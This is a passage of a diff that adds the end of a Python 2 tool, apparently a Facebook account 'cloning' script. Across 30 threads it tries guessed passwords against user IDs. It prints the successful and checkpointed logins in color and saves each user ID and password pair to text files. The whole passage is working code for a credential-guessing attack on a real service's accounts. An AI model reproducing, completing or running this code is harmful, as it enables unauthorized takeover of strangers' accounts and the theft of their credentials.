+                                    print '\x1b[1;93m[\x1b[1;92mKgf_Ok\x1b[1;93m]\x1b[1;93m  ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass6 + '\n' + '\n'
+                                    okb = open('save/successfull.txt', 'a')
+                                    okb.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass5 + '\n')
+                                    okb.close()
+                                    oks.append(k + c + user + pass6)
+                                elif 'www.facebook.com' in q['error_msg']:
+                                    print '\x1b[1;93m[Kgf_Cp]\x1b[1;93m ' + k + c + user + ' \x1b[1;91m-\xe2\x8b\x84-\x1b[1;93m ' + pass6 + '\n'
+                                    cps = open('save/checkpoint.txt', 'a')
+                                    cps.write(k + c + user + '-\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2-' + pass4 + '\n')
+                                    cps.close()
+                                    cpb.append(k + c + user + pass6)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print '\x1b[1;97m--------------------------------------------------'
+    print '[\xe2\x9c\x93]\x1b[1;94m Process Has Been Completed ...'
+    print '[\xe2\x9c\x93]\x1b[1;92m Total Kgf_Ok\x1b[1;91m/\x1b[1;92mKgf_Cp : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93]\x1b[1;94m Cloned Accounts Has Been Saved : techabm/clone.txt'
+    raw_input('\n\x1b[1;97m[\x1b[1;97mPress Enter Go Back\x1b[1;95m]')
+    print '\x1b[1;97m--------------------------------------------------'
+    menu()
+
+
+if __name__ == '__main__':
+    menu()
